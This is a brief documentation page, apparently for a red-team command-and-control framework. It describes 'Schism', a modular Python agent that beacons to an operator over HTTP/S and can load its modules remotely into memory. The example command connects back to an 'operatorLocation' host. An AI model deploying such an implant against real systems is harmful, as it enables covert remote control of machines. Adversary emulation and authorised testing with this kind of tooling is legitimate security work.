---
title: "Schism"
slug: "schism"
excerpt: ""
hidden: false
metadata: 
  image: []
  robots: "index"
createdAt: "Wed Jun 29 2022 16:58:30 GMT+0000 (Coordinated Universal Time)"
updatedAt: "Wed Jun 29 2022 16:58:30 GMT+0000 (Coordinated Universal Time)"
---
Schism is a fully modular Python agent which supports http/https protocols

***

There is currently 1 Protocol supported for schism:

- HTTP/S

### Special Versions of Schism

- Android (which runs over http)

#### Using Schism

- Since schism is fully modular, you can include any additional modules by specifying them with the -m option
- If the target doesn't have internet access, you can stand up a listener and host the modules directory with the -r option
- If the -r option is left blank, schism will attempt to load modules via github directly into memory.

```python
python3 schism.py -r http://localhost/modules -m beacon executor -a http://operatorLocation:3391 -s 5
```

This command would attempt to load from modules from localhost, use the default beacon and executor modules, connect into operator via http, and sleep for 5 seconds in-between beacons.
